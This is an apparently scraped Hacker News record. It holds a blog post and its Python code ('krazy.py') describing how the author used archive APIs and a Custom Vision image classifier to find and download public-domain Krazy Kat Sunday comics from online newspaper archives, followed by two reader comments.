Requests Fantagraphics for their amazing Krazy Kat books The Chicago Public Library Digital Collections the Chronicling America archive from the Library of Congress, and newspapers.com. Full code listing Below is the full code listing for the code in krazy.py: from collections import OrderedDict import datetime import itertools import os import shutil import sys import requests from requests import Request from requests import Session newspapers_dates = {'80665811': '1922-01-08', '80689957': '1922-04-02', '80709570': '1922-07-02', '80725318': '1922-10-29', '80727456': '1922-12-31', '80726753': '1922-12-10', '80726259': '1922-11-26', '79961860': '1921-12-18', '79953764': '1921-12-04', '80670129': '1922-01-22', '79907475': '1921-10-02', '80705478': '1922-06-11', '80688098': '1922-03-26', '80673928': '1922-02-05', '80719993': '1922-09-24', '80721727': '1922-10-01', '80672004': '1922-01-29', '80664354': '1922-01-01', '80716571': '1922-08-27', '80701622': '1922-05-21', '80667982': '1922-01-15', '87593725': '1922-05-07', '79894942': '1921-09-04', '80704313': '1922-06-04', '80694291': '1922-04-16', '80685564': '1922-03-19', '80675323': '1922-02-12', '80725764': '1922-11-12', '80726016': '1922-11-19', '87594108': '1921-10-09', '80703107': '1922-05-28', '80700357': '1922-05-14', '79920320': '1921-10-23', '79926556': '1921-10-30', '80722923': '1922-10-08', '80713478': '1922-07-23', '80726503': '1922-12-03', '79890293': '1921-08-28', '79936055': '1921-11-13', '79957306': '1921-12-11', '79965938': '1921-12-25', '80724021': '1922-10-15', '80679279': '1922-02-26', '80677355': '1922-02-19', '79931806': '1921-11-06', '457887501': '1918-02-17', '457410714': '1918-10-13', '457486179': '1918-10-27', '457772423': '1917-11-25', '458059568': '1918-09-15', '458050238': '1918-12-29', '458077200': '1919-03-23', '457466753': '1917-07-29', '457770405': '1922-02-12', '458016697': '1919-08-03', '458038653': '1919-08-10', '458059136': '1919-08-17', '458077492': '1919-08-24', '458028215': '1919-09-07', '458041825': '1919-09-14', '458078329': '1919-09-28', '459426476': '1919-10-05', '459431409': '1919-10-12', '459439720': '1919-10-19', '459459432': '1919-10-26', '457500046': '1919-11-02', '457538069': '1919-11-09', '457568326': '1919-11-16', '457798935': '1922-05-07', '458112864': '1919-07-20', '457997191': '1919-06-29', '457981504': '1919-06-22', '457965904': '1919-06-15', '457949266': '1919-06-08', '457744406': '1919-05-25', '457713998': '1919-05-18', '457674936': '1919-05-11', '457638508': '1919-05-04', '458042002': '1919-04-27', '458017299': '1919-04-20', '458002234': '1919-04-13', '458088822': '1919-03-30', '458036405': '1919-03-02', '457826061': '1919-02-23', '457807708': '1919-02-16', '457783911': '1919-02-09', '457756906': '1919-02-02', '457734895': '1919-01-26', '457716429': '1919-01-19', '457689797': '1919-01-12', '458026097': '1918-12-22', '458005517': '1918-12-15', '457988045': '1918-12-08', '457972362': '1918-12-01', '457457766': '1918-11-24', '457432240': '1918-11-17', '458033338': '1918-09-01', '457456172': '1918-08-25', '459474336': '1918-07-28', '457842118': '1918-01-20', '457535192': '1917-12-30', '457479729': '1917-12-16', '457444762': '1917-12-09', '457412844': '1917-12-02', '457744171': '1917-11-18', '457716428': '1917-11-11', '457690452': '1917-11-04', '457999366': '1917-10-28', '457991489': '1917-10-21', '457982762': '1917-10-14', '457968714': '1917-10-07', '457789970': '1917-09-30', '457733519': '1917-09-16', '457691222': '1917-09-02', '457634671': '1917-08-19', '457611018': '1917-08-12', '457750102': '1920-02-22', '458018980': '1918-06-02', '458033403': '1918-06-09', '458069378': '1918-06-30', '457927118': '1919-06-01', '457397341': '1918-08-11', '457374766': '1918-08-04', '457402773': '1918-11-10', '458101599': '1919-07-13', '457652116': '1920-02-01', '457591813': '1920-03-07', '457707791': '1920-04-04', '458071940': '1918-09-22', '457374825': '1918-11-03', '458045487': '1918-09-08', '457419977': '1918-08-18', '457716141': '1918-07-14', '457756843': '1918-07-21', '457686530': '1918-07-07', '458055618': '1918-06-16', '458062639': '1918-06-23', '457913412': '1918-05-26', '457888648': '1918-05-19', '457865553': '1918-05-12', '457679991': '1918-04-28', '457847884': '1918-05-05', '457648693': '1918-04-21', '457614524': '1918-04-14', '457583278': '1918-04-07', '459521355': '1918-03-31', '459501540': '1918-03-24', '459478635': '1918-03-17', '459443573': '1918-03-03', '459458580': '1918-03-10', '457909624': '1918-02-24', '457864292': '1918-02-10', '457848649': '1918-01-27', '457830075': '1918-01-13', '457761784': '1917-09-23', '457668918': '1917-08-26'} comics_ha_dates = {'811-5025': '1910-00-00', '7013-93220': '1916-07-29', '7030-92126': '1916-08-06', '17074-16040': '1916-08-20', '18064-14821': '1916-08-20', '7087-92096': '1916-09-10', '18065-15773': '1917-00-00', '7158-92123': '1917-00-00', '817-5488': '1917-00-00', '7192-91012': '1917-03-25', '7079-92139': '1917-07-17', '18073-13574': '1917-07-29', '7023-93116': '1917-08-12', '828-42093': '1917-11-18', '826-43281': '1917-12-16', '815-3311': '1918-00-00', '829-41419': '1918-02-24', '7209-93108': '1918-03-03', '18071-11607': '1918-03-31', '802-6533': '1918-05-05', '18041-11763': '1918-05-19', '7066-92040': '1918-06-23', '18104-14546': '1918-07-21', '7017-94086': '1918-07-21', '18012-12649': '1918-08-11', '18072-12536': '1918-09-15', '828-42094': '1918-10-13', '17124-16682': '1918-10-20', '7104-91138': '1918-10-27', '7066-93239': '1918-11-10', '7177-92090': '1918-12-22', '826-43285': '1919-00-00', '7204-91025': '1919-01-26', '17113-17707': '1919-02-02', '17112-16758': '1919-03-09', '17123-17745': '1919-07-29', '7158-92201': '1919-08-10', '7209-93109': '1919-08-17', '17114-16855': '1919-10-19', '827-43303': '1919-10-26', '7093-92081': '1919-11-23', '17125-17685': '1919-12-21', '7066-92041': '1920-00-00', '825-41055': '1920-00-00', '826-43284': '1920-00-00', '17121-17588': '1920-02-01', '7137-92011': '1920-02-08', '18033-73672': '1920-02-22', '7189-92080': '1920-02-29', '7017-94087': '1920-03-28', '7136-92230': '1920-03-28', '7084-92159': '1920-05-02', '825-41056': '1920-06-20', '17122-16874': '1920-09-16', '7163-93102': '1920-11-07', '18032-72747': '1920-11-21', '7189-92081': '1920-11-28', '7166-92007': '1920-12-26', '17061-17710': '1921-01-30', '827-43304': '1921-03-06', '829-41420': '1921-03-20', '826-43282': '1921-03-27', '17093-16037': '1921-06-04', '18034-74684': '1921-10-30', '821-44248': '1921-11-06', '823-42313': '1921-11-20', '7054-92116': '1922-04-02', '826-43283': '1922-04-23', '7192-91013': '1922-04-30', '7141-93110': '1922-06-11', '7036-92119': '1922-06-25', '7076-92176': '1922-06-25', '18035-75757': '1922-07-09', '7163-93103': '1922-10-01', '823-42314': '1922-10-08', '825-41057': '1922-10-15', '7137-92012': '1922-11-19', '7204-91026': '1923-01-21', '7152-92103': '1926-05-02', '825-41058': '1928-10-28', '811-5026': '1931-12-27', '7104-91139': '1932-04-03', '7104-91140': '1932-07-31', '7084-92160': '1932-08-28', '7141-93111': '1932-10-16', '821-44249': '1932-12-25', '7079-92141': '1933-05-28', '7152-92104': '1933-05-28', '7013-93221': '1934-03-25', '810-1062': '1934-03-25', '7177-92006': '1934-05-27', '7104-91141': '1934-11-11', '7187-93125': '1935-11-03', '821-44247': '1935-11-10', '822-45259': '1936-00-00', '822-45258': '1936-01-19', '7158-92202': '1937-10-10', '7059-92175': '1937-12-12', '824-44179': '1938-02-06', '7023-93117': '1938-09-25', '7066-93238': '1940-02-11', '7189-92082': '1940-03-17', '7084-92161': '1941-05-04', '7139-92093': '1941-11-02', '7177-92091': '1942-05-03', '7036-92120': '1942-05-31', '7021-92108': '1942-08-30', '802-6535': '1942-12-06', '7099-92032': '1943-10-03', '814-6044': '1943-10-31', '7023-93119': '1944-06-25'} class Source: sep = '-' file_suffix = '.jpg' date = None from_page = None def __init__(self, filename=None, session=None): self._parts = [] if session: # print('Setting session to: {}'.format(session)) self.session = session if filename: # Remove the file extension name = os.path.splitext(filename)[0] # self._parts = name.split(self.sep)[4:] self._parts = name.split(self.sep) @property def id(self): return(self.sep.join([self.source_id, self.identifier])) @property def identifier(self): rv = None if self._parts: rv = self.sep.join(self._parts) return(rv) @property def suggested_name(self): return(self.identifier + self.file_suffix) @property def full_size(self): return None @property def thumbnail(self): return None def request(self): url = self.full_size return(Request('GET', url).prepare()) def __repr__(self): return('<{} {}>'.format(self.__class__.__name__, self.identifier)) class LocGov(Source): source_id = 'chroniclingamerica.loc.gov' file_suffix = '.jp2' _base_url = 'http://' + source_id from_page_template = _base_url + '/lccn/{lccn}/{date}/ed-{ed}/seq-{seq}' _search_url = _base_url + '/search/pages/results/' url_template = from_page_template + file_suffix def sunday_pages(self): search_payload = { 'date1': '1913', 'date2': '1944', 'proxdistance': '5', 'proxtext': 'krazy+herriman', 'sort': 'relevance', 'format': 'json' } results_seen = 0 page = 1 urls = [] while True: search_payload['page'] = str(page) # print('Fetching page {}'.format(page)) result = self.session.get(self._search_url, params=search_payload).json() for item in result['items']: results_seen += 1 url = item['url'] if url: yield self._bootstrap_from_url(item['url']) if(results_seen < result['totalItems']): page += 1 else: # print('Found {} items'.format(results_seen)) break @property def date(self): return('-'.join(self._parts[2:6])) @property def _named_parts(self): return({'lccn': self._parts[2], 'date': self.date, 'ed': self._parts[7], 'seq': self._parts[9]}) @property def full_size(self): return(self.url_template.format(**self._named_parts)) @property def from_page(self): return(self.from_page_template.format(**self._named_parts)) @property def thumbnail(self): url = self.from_page + '/image_92x120_from_0,0_to_5698,6998.jpg' return(url) def _bootstrap_from_url(self, url): # http://chroniclingamerica.loc.gov/lccn/sn84026749/1922-04-16/ed-1/seq-50.json url = url.replace('.json', '') self._parts = url.replace('-', '/').split('/')[2:] return self class NewspapersCom(Source): source_id = 'newspapers.com' url_template = 'https://www.newspapers.com/download/image/?type=jpg&id={id}' @property def _sundays(self): start_day = '1916-04-23' end_year = 1924 date = datetime.datetime.strptime(start_day, '%Y-%m-%d') sundays = [] while date.year < end_year: if date.strftime('%A') == 'Sunday': yield date date += datetime.timedelta(days=7) def sunday_pages(self): urls = [ 'http://www.newspapers.com/api/browse/1/US/California/San%20Francisco/The%20San%20Francisco%20Examiner_9317', 'http://www.newspapers.com/api/browse/1/US/District%20of%20Columbia/Washington/The%20Washington%20Times_1607' ] for url in urls: for day in self._sundays: day_path = day.strftime('/%Y/%m/%d') rv = self.session.get(url + day_path).json() if 'children' not in rv: continue for page in rv['children']: self._parts = [ self.source_id, day.strftime('%Y'), day.strftime('%m'), day.strftime('%d'), 'id', page['name'] ] yield self @property def img_id(self): return(self._parts[-1]) @property def date(self): if self.img_id in newspapers_dates: return(newspapers_dates[self.img_id]) return(None) @property def from_page(self): from_url_template = 'https://www.newspapers.com/image/{}/' return(from_url_template.format(self.img_id)) @property def full_size(self): values = { 'id': self.img_id } return(self.url_template.format(**values)) def request(self): # https://2.python-requests.org//en/latest/user/quickstart/#redirection-and-history # \"By default Requests will perform location redirection for all verbs except HEAD.\" url = self.full_size return(Request('GET', url, headers=self.headers, cookies=self.cookies).prepare()) @property def thumbnail(self): return('http://img.newspapers.com/img/thumbnail/{}/90/90.jpg'.format(self.img_id)) class ChipublibOrg(Source): source_id = 'digital.chipublib.org' _base_url = 'http://' + source_id _full_size_url = _base_url + '/digital/download/collection/examiner/id/{id}/size/full' _thumbnail_url = _base_url + '/digital/api/singleitem/collection/examiner/id/{id}/thumbnail' _info_url = _base_url + '/digital/api/collections/{collection}/items/{id}/false' url_template = _full_size_url _chipublib_defaults = [ ('collection', 'examiner'), ('order', 'date'), ('ad', 'dec'), ('page', '1'), ('maxRecords', '100'), ] def _url(self, **inputs): options = OrderedDict(self._chipublib_defaults) for key in inputs: if key in options: value = inputs[key] if isinstance(value, int): value = str(value) options[key] = value path = '/'.join(itertools.chain.from_iterable(options.items())) search_url = 'http://{source_id}/digital/api/search/{path}'.format(source_id=self.source_id, path=path) return search_url def _bootstrap_from_id(self, item_id): defaults = dict(self._chipublib_defaults) values = {'id': item_id, 'collection': defaults['collection']} url = self._info_url.format(**values) # print('url: ' + url) result = self.session.get(url).json() fields = dict([(field['key'], field['value']) for field in result['fields']]) for child in result['parent']['children']: page_number = child['title'].split(' ')[1] # digital.chipublib.org-examiner-1917-12-16-page-34-item-88543 self._parts = [self.source_id, defaults['collection']] self._parts.extend(fields['date'].split(self.sep)) self._parts.extend(['page', str(page_number), 'item', str(child['id'])]) yield self def sunday_pages(self): resultsSeen = 0 page = 1 while True: result = self.session.get(self._url(page=page)).json() for record in result['items']: resultsSeen += 1 metadata = dict([(item['field'], item['value']) for item in record['metadataFields']]) record_date = datetime.datetime.strptime(metadata['date'], '%Y-%m-%d') # Krazy Kat ... a comic strip by cartoonist George Herriman, ... ran from 1913 to 1944. if record_date.year < 1913: continue if record_date.strftime('%A') != 'Sunday': continue item_id = record['itemId'] for page in self._bootstrap_from_id(item_id): yield page if(resultsSeen < result['totalResults']): page += 1 else: break @property def full_size(self): values = { 'id': self._parts[-1] } return(self._full_size_url.format(**values)) @property def thumbnail(self): values = { 'id': self._parts[-1] } return(self._thumbnail_url.format(**values)) @property def date(self): # digital.chipublib.org-examiner-1917-08-19-page-38-item-85416 return('-'.join(self._parts[2:5])) @property def from_page(self): from_page_template = 'http://digital.chipublib.org/digital/collection/examiner/id/{}' return(from_page_template.format(self._parts[-1])) # class WikipediaOrg(Source): # # https://commons.wikimedia.org/wiki/File:Krazy_Kat_1922-06-25_hand-colored.jpg # url_template = 'https://commons.wikimedia.org/wiki/File:{id}' class ComicsHaCom(Source): source_id = 'comics.ha.com' from_url_template = 'https://comics.ha.com/itm/a/{}.s' @property def date(self): if self.identifier in comics_ha_dates: return(comics_ha_dates[self.identifier]) return(None) @property def from_page(self): cid = '{}-{}'.format(self._parts[-2], self._parts[-1]) return(self.from_url_template.format(cid)) class ComicstriplibraryOrg(Source): source_id = 'www.comicstriplibrary.org' @property def date(self): date = { 'year': self.identifier[0:4], 'month': self.identifier[4:6], 'day': self.identifier[6:8], } return('{year}-{month}-{day}'.format(**date)) @property def full_size(self): template = 'https://www.comicstriplibrary.org/images/comics/krazy-kat/krazy-kat-{}.png' return template.format(self.identifier) class Finder: def __init__(self, download_to='images', proxies=None): self.sources = {} self.session = Session() if proxies: # print('Configuring proxies: {}'.format(proxies)) self.session.proxies = proxies self.download_to = download_to if not os.path.exists(download_to): os.mkdir(download_to) def add(self, source): self.sources[source.source_id] = source def sunday_pages(self): for source_id in self.sources: source = self.sources[source_id](session=self.session) # print('From: {}'.format(source)) for url in source.sunday_pages(): yield url def identify(self, line): line = line.rstrip() filename = os.path.basename(line) source = filename.split('-')[3] if source in self.sources: return self.sources[source](filename) else: print('Unknown source: {}'.format(source)) def download(self, img): filename = os.path.join(self.download_to, img.suggested_name) if not os.path.isfile(filename): print('Downloading: {}'.format(filename)) return(False) prepared_request = img.request() # https://stackoverflow.com/a/16696317 with self.session.send(prepared_request, stream=True) as r: r.raise_for_status() with open(filename, 'wb') as f: for chunk in r.iter_content(chunk_size=8192): if chunk: # filter out keep-alive new chunks f.write(chunk) ",
          "This is honestly one of the best uses of ML I've read about.  A large amount of boring work that isn't easily handled by a descriptive model.",
          "I'm tempted to repeat this for the Little Nemo in Slumberland comic strip [1]  that ran in the early 1900's.  Like the Krazy Kat comics, the Fantagraphics collections of the strips are long out of print and expensive when found usd.<p>[1]  <a href=\"https://en.wikipedia.org/wiki/Little_Nemo\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Little_Nemo</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://joel.franusic.com/krazy_kat/about/",
        "comments.comment_id": [20309494, 20310223],
        "comments.comment_author": ["vharuck", "JoeDaDude"],
        "comments.comment_descendants": [1, 3],
        "comments.comment_time": [
          "2019-06-28T22:58:10Z",
          "2019-06-29T01:27:01Z"
        ],
        "comments.comment_text": [
          "This is honestly one of the best uses of ML I've read about.  A large amount of boring work that isn't easily handled by a descriptive model.",
          "I'm tempted to repeat this for the Little Nemo in Slumberland comic strip [1]  that ran in the early 1900's.  Like the Krazy Kat comics, the Fantagraphics collections of the strips are long out of print and expensive when found usd.<p>[1]  <a href=\"https://en.wikipedia.org/wiki/Little_Nemo\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Little_Nemo</a>"
        ],
        "id": "d97822fb-c121-452e-9e7b-a9dfa0707827",
        "url_text": "Summary This page goes into detail on how I used Machine Learning to find hundreds of Krazy Kat comics that are now in the public domain. As a result of this project, several hundred high resolution scans of Krazy Kat comics are now easily available online, including a comic that I couldn't find in any published book! What follows is a detailed description of what I did to find these comics in online newspaper archives. About After becoming a little obsessed with Krazy Kat, I was very disappointed to see many of the books I wanted were incredibly expensive. For example \"Krazy & Ignatz: The Complete Sunday Strips 1916-1924\" was selling on Amazon for nearly $600 and \"Krazy & Ignatz 1922-1924: At Last My Drim Of Love Has Come True\" was selling for nearly $90. At some point, I realized that the copyright for many of the comics that I was looking for has expired and that these public domain comics were likely available in online newspaper archives. So, driven a desire to obtain the \"unobtainable\" and mostly by curiosity to see if it was possible, I set out to see if I could find public domain Krazy Kat Sunday comics in online newspaper archives. As you can see in the \"Comics\" section of this site, it is possible to find Krazy Kat comics in online newspaper archives and I've made all of the comics I could find viewable on this web page. If all you want to do is read Krazy Kat comics, I encourage you to click on the \"Comics\" link above. I hope that by being able to read the comics online, you'll be inspired to buy one of the reprints from Fantagraphics. Krazy Kat is best appreciated in the medium it was designed for and the books that Fantagraphics publishes are a delight. You can find the books that I recommend in the \"Buy\" section of this site. What follows below is a detailed description of the code I wrote to find the Krazy Kat comics in newspaper archives. I also wrote my recommendations for curators of newspaper archives, as well as my advice for for people who want to build upon, or replicate, my work. Finally, I close with a long list of things that I wish I could have done, in the hope that someone else will be inspired to do them. How to find Krazy Kat comics in newspaper archives In short, I wrote some programs in Python that downloaded thumbnails from various newspaper archives, manually found about 100 Sunday comic strips from the thumbnails, used Microsoft's Custom Vision service to train an image classifier to detect Krazy Kat comics in thumbnail images, used that classifier to find several hundred more thumbnails, then wrote some more code in Python to download high resolution images of all of the thumbnails that I found. This was done in several stages: Learning about Krazy Kat Discussing feasibility of the project with an ML expert Searching for archives that contain Krazy Kat Sunday comics Writing code to download thumbnails from newspaper archives Training an image classifier Using the image classifier to find more thumbnails Writing code to download full size images Finding comics in other online archives I go into detail on each of those stages in the sections below: Learning about Krazy Kat If it were not for a chance encounter with Krazy Kat and The Art of George Herriman at Pegasus Books I wouldn't be familiar with the series myself. The reason I picked up the book in the first place is because the comic strip Calvin and Hobbes was such a big part of my childhood, and I remembered how Bill Watterson referenced Krazy Kat as a big reason why he insisted on getting a larger full color format for his Sunday comic strips. Once I finished reading \"Krazy Kat and The Art of George Herriman\" I started to buy the fantastic books from Fantagraphics. However, as stated above, I felt frustrated that some of the books so expensive. Discussing feasibility of the project with an ML expert The real genesis of this project however, was a conversation I had with Tyler Neylon about one of the projects he was working on at Unbox Research a machine learning research & development company. Speaking with Tyler got me thinking about the types of projects I could use machine learning with, and the idea of using machine learning to help me find Krazy Kat images was the most interesting of the things that we discussed. Searching for archives that contain Krazy Kat Sunday comics Before I could get started with machine learning, I had to see if the idea was feasible at all, were there any newspaper archives online that had Krazy Kat comics? Many of the newspapers that I initially checked didn't have any trace of Krazy Kat. I was starting to get worried until I found the archive of the Chicago Examiner (1908-1918) that the Chicago Public Library keeps online. This was exciting! It's fortunate that I found the Chicago Examiner archive as soon as I did, because it turns out that it's not very easy to find newspapers with Krazy Kat Sunday comics in them! After many hours of frustrating research, I was finally able to narrow determine that Krazy Kat Sunday comics are available from the following sources: Sunday comics: The Chicago Examiner via the Chicago Public Library The Washington Times via the excellent \"Chronicling America\" archive at the Library of Congress Newspapers.com HA.com In the process of looking for Sunday comics, I was also able to find several newspapers in various archives that also have copies of the daily Krazy Kat comics. However, given a self-imposed deadline I set for myself, I didn't have the time to do anything other than make a list of newspapers that have the dailies. Below is a list of newspaper archives and the year that I was able to find daily Krazy Kat comics: Daily comics: The St. Louis Star and Times (1913) The Oregon Daily Journal (1914) The Lincoln Star (1919) El Paso Herald (1919) The San Francisco Examiner (1920) Salt Lake Telegram (1920) The Pittsburgh Press (1920) The Minneapolis Star (1920) The Lincoln Star (1920) Writing code to download thumbnails from newspaper archives Once I had sources for newspaper scans, my next step was to download thumbnails from the archives I found. The main reason to use thumbnails over full sized images is that the average size of a thumbnail is about 4KiB while the size of a full resolution scan can be nearly 7 MiB! I was also very curious if I could detect Krazy Kat comics using only thumbnails. In general, my specific goal for each of the newspaper archives was to download as many thumbnails as I could from Sunday editions published before 1923 (as of 2019, works published before 1923 are in the public domain) Some of the newspaper archives had better APIs for finding and fetching images than others. Surprisingly, the internal API that Newspapers.com uses for their archives was the easiest to use. I ended up writing several different Python scripts to download each thumbnail collection individually. After seeing the similarities between them, I decided to put all the logic together into a single Python package called \"krazy.py\" using this package, we can get a list of all thumbnails from known newspaper archives with code like this: import krazy proxies = { 'http': 'http://localhost:3030', } This code has two parts. The first part handles registering of the different \"Finders\" that I implemented, which know how to find Sunday pages: finder = krazy.Finder(proxies=proxies) finder.add(krazy.NewspapersCom) finder.add(krazy.LocGov) finder.add(krazy.ChipublibOrg) And the second part will query all registered \"Finders\" for their Sunday pages, using the .sunday-pages() method: for page in finder.sunday_pages(): print('get-thumbnails.py {}'.format(page)) print(\"\\t thumbnail {}\".format(page.thumbnail)) print(\"\\t suggested {}\".format(page.suggested_name)) print(\"\\t full name {}\".format(page.full_size)) This code in turn will call the \"Finders\" for the Newspapers.com, Library of Congress, and Chicago Public Library archives. All of these classes implement the base \"Source\" class, which contains some syntactic sugar that makes working with all of the different finders a little easier. One thing to note is that these classes are written to make it easy to convert between the URL for a full size image full_size, the URL for the corresponding thumbnail image thumbnail, and the suggested local filename for that same image suggested_name. Here's what all the code above looks like in a single file: import krazy proxies = { 'http': 'http://localhost:3030', } finder = krazy.Finder(proxies=proxies) finder.add(krazy.NewspapersCom) finder.add(krazy.LocGov) finder.add(krazy.ChipublibOrg) for page in finder.sunday_pages(): print('get-thumbnails.py {}'.format(page)) print(\"\\t thumbnail {}\".format(page.thumbnail)) print(\"\\t suggested {}\".format(page.suggested_name)) print(\"\\t full name {}\".format(page.full_size)) With that in mind, let's start with the code for getting Sunday pages from the Newspapers.com archives. This code was pretty easy to write, I calculate all the dates that have Sundays, then query the Newspapers.com API for the pages for that date. class NewspapersCom(Source): source_id = 'newspapers.com' url_template = 'https://www.newspapers.com/download/image/?type=jpg&id={id}' @property def _sundays(self): start_day = '1916-04-23' end_year = 1924 date = datetime.datetime.strptime(start_day, '%Y-%m-%d') sundays = [] while date.year < end_year: if date.strftime('%A') == 'Sunday': yield date date += datetime.timedelta(days=7) def sunday_pages(self): urls = [ 'http://www.newspapers.com/api/browse/1/US/California/San%20Francisco/The%20San%20Francisco%20Examiner_9317', 'http://www.newspapers.com/api/browse/1/US/District%20of%20Columbia/Washington/The%20Washington%20Times_1607' ] for url in urls: for day in self._sundays: day_path = day.strftime('/%Y/%m/%d') rv = self.session.get(url + day_path).json() if 'children' not in rv: continue for page in rv['children']: self._parts = [ self.source_id, day.strftime('%Y'), day.strftime('%m'), day.strftime('%d'), 'id', page['name'] ] yield self This is the code for getting Sunday pages from the Library of Congress archives. In this case, I actually take advantage of a search query for \"krazy kat\" and return all of those pages. I did this because the Library of Congress archive was what I first started with. If I wrote this again, I'd implement it without a search. class LocGov(Source): source_id = 'chroniclingamerica.loc.gov' file_suffix = '.jp2' _base_url = 'http://' + source_id from_page_template = _base_url + '/lccn/{lccn}/{date}/ed-{ed}/seq-{seq}' _search_url = _base_url + '/search/pages/results/' url_template = from_page_template + file_suffix def sunday_pages(self): search_payload = { 'date1': '1913', 'date2': '1944', 'proxdistance': '5', 'proxtext': 'krazy+herriman', 'sort': 'relevance', 'format': 'json' } results_seen = 0 page = 1 urls = [] while True: search_payload['page'] = str(page) # print('Fetching page {}'.format(page)) result = self.session.get(self._search_url, params=search_payload).json() for item in result['items']: results_seen += 1 url = item['url'] if url: yield self._bootstrap_from_url(item['url']) if(results_seen < result['totalItems']): page += 1 else: # print('Found {} items'.format(results_seen)) break And finally, here is the code for getting Sunday pages from the Chicago Public Library archives. As you can see, this is pretty involved. The supporting cast in this object are the _url method, which creates URLs for the Chicago Public Library API, and the _bootstrap_from_url method, which creates an instance of a ChipublibOrg object. _url and _bootstrap_from_url are then used by the sunday_pages method to return objects representing Sunday pages from the Chicago Public Library archive. class ChipublibOrg(Source): source_id = 'digital.chipublib.org' _base_url = 'http://' + source_id _full_size_url = _base_url + '/digital/download/collection/examiner/id/{id}/size/full' _thumbnail_url = _base_url + '/digital/api/singleitem/collection/examiner/id/{id}/thumbnail' _info_url = _base_url + '/digital/api/collections/{collection}/items/{id}/false' url_template = _full_size_url _chipublib_defaults = [ ('collection', 'examiner'), ('order', 'date'), ('ad', 'dec'), ('page', '1'), ('maxRecords', '100'), ] def _url(self, **inputs): options = OrderedDict(self._chipublib_defaults) for key in inputs: if key in options: value = inputs[key] if isinstance(value, int): value = str(value) options[key] = value path = '/'.join(itertools.chain.from_iterable(options.items())) search_url = 'http://{source_id}/digital/api/search/{path}'.format(source_id=self.source_id, path=path) return search_url def _bootstrap_from_id(self, item_id): defaults = dict(self._chipublib_defaults) values = {'id': item_id, 'collection': defaults['collection']} url = self._info_url.format(**values) # print('url: ' + url) result = self.session.get(url).json() fields = dict([(field['key'], field['value']) for field in result['fields']]) for child in result['parent']['children']: page_number = child['title'].split(' ')[1] # digital.chipublib.org-examiner-1917-12-16-page-34-item-88543 self._parts = [self.source_id, defaults['collection']] self._parts.extend(fields['date'].split(self.sep)) self._parts.extend(['page', str(page_number), 'item', str(child['id'])]) yield self def sunday_pages(self): resultsSeen = 0 page = 1 while True: result = self.session.get(self._url(page=page)).json() for record in result['items']: resultsSeen += 1 metadata = dict([(item['field'], item['value']) for item in record['metadataFields']]) record_date = datetime.datetime.strptime(metadata['date'], '%Y-%m-%d') # Krazy Kat ... a comic strip by cartoonist George Herriman, ... ran from 1913 to 1944. if record_date.year < 1913: continue if record_date.strftime('%A') != 'Sunday': continue item_id = record['itemId'] for page in self._bootstrap_from_id(item_id): yield page if(resultsSeen < result['totalResults']): page += 1 else: break Visually confirming images Once I was able to get a list of thumbnail image URLs, I wrote a script to download each of those thumbnails into a local file named using the suggested_name() for each thumbnail. For example, this URL: http://digital.chipublib.org/digital/api/singleitem/collection/examiner/id/88888/thumbnail would be saved as this file: digital.chipublib.org-examiner-1917-12-30-page-31-item-88888.jpeg At this point, I had a folder full of thumbnail images, that looked something like this: Using Finder in macOS, I scanned over each image personally. When I found a thumbnail that looked like it contained Krazy Kat, I'd use the identifier in the filename to load up the full sized image. For example, if I thought that this thumbnail contained Krazy Kat: Then I would take the identifier from that filename (in this case \"88888\") and use that to load up the full sized image, which in this example would be this URL: http://digital.chipublib.org/digital/collection/examiner/id/88888 If the thumbnail did turn out to contain a Krazy Kat comic, then I'd tag the file in Finder. In my case, I tagged thumbnails for Krazy Kat comics with \"Green\", but the color doesn't matter. After tagging about 100 images, I was ready to learn to train a custom \"image classifier\" that I could use to find even more Krazy Kat comics for me. Training an image classifier Initially, my plan was to use this project as an excuse to learn to use TensorFlow. However, after about 4 frustrating hours of trying to get TensorFlow, Karas, or PyTorch running, I just gave up. Most frustrating of all was Illegal instruction: 4 error message that I kept getting from TensorFlow. Apparently the Mac I use at home is too old for modern versions of TensorFlow? In any event, thanks to a suggestion from my friend Timothy Fitz, who suggested that I use Google's Auto ML. I realized that I could use a cloud service to train an image classifier instead. With that in mind, I decided to give Microsoft's Custom Vision service instead. In short, Custom Vision is a wonderful service. It was easy to use and gave me exactly what I wanted. All I had to do to build an image classifier with Custom Vision was to upload the 100 or so thumbnails that I found with Krazy Kat sunday comics in them, tag those images \"krazy\" and then upload about 100 images that did not have Krazy Kat in them. To get the thumbnails I found with Krazy Kat, I simply made a \"Smart Folder\" in macOS that contained all images tagged \"Green\" I simply selected all of the images from the Smart Folder and dragged them into Custom Vision to upload them. After tagging those images as \"krazy\" I repeated the process to upload thumbnails that didn't have Krazy Kat and tagged those as \"Negative\" After that, I spent some time playing with Custom Vision, working on improving the rate at which it correctly recognized thumbnails with Krazy Kat. An interesting part of this exercise is that I ended up feeling like I was doing \"meta-programming\" rather than looking for patterns myself, I just spent more time finding thumbnails that appeared to have Krazy Kat, but didn't. One word of warning, using the \"Advanced Training\" option costs money and it's not clear how much the training will cost. I ended up spending just over $180 on Advanced Training before I realized how much I had spent! Using the image classifier to find candidates in Library of Congress archive Once I was fairly confidant with the image classification model that Custom Vision made, it was time to test it out in the real world. Initially, I had hoped to use Custom Vision's ability to export TensorFlow models so I could run image classification locally on my computer. My main concern was that I didn't want to upload each thumbnail to Custom Vision. However, given how much trouble I had getting TensorFlow working, I decided to use Custom Vision's API directly. I was very pleased to learn that the API could take the URL for an image as an option, meaning that I could have Custom Vision fetch the thumbnails directly from the newspaper fetch! I wrote two \"one off\" scripts to make use of the Custom Vision API: ms-predict.py This was the first script I wrote, which uploaded thumbnails to the Custom Vision API. It's pretty simple and proved to me that it the API worked. custom-vision-find-kats-loc.py This was the second script I wrote. I also implemented the Custom Vision API because somehow I missed that they already had a Python library. In any event, this script sent URLs to the Custom Vision API Using a combination of both of these scripts, I was able to find about another couple of hundred thumbnails for Krazy Kat Sunday comics. Writing code to download full size images Thanks to the Custom Vision API, I finally had several hundred thumbnails on my computer. All of these thumbnails were tagged \"Green\" and had unique names that I could use to find their corresponding full size image. Because they were all tagged \"Green\", I could use the mdfind command in macOS to get a list of all the thumbnails I'd found. This is the command I used to get all of the tagged thumbnails: mdfind \"kMDItemUserTags == Green\" And here is an example of what the output looked like: $ mdfind \"kMDItemUserTags == Green\" ... ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-12-31-ed-1-seq-49.jpeg 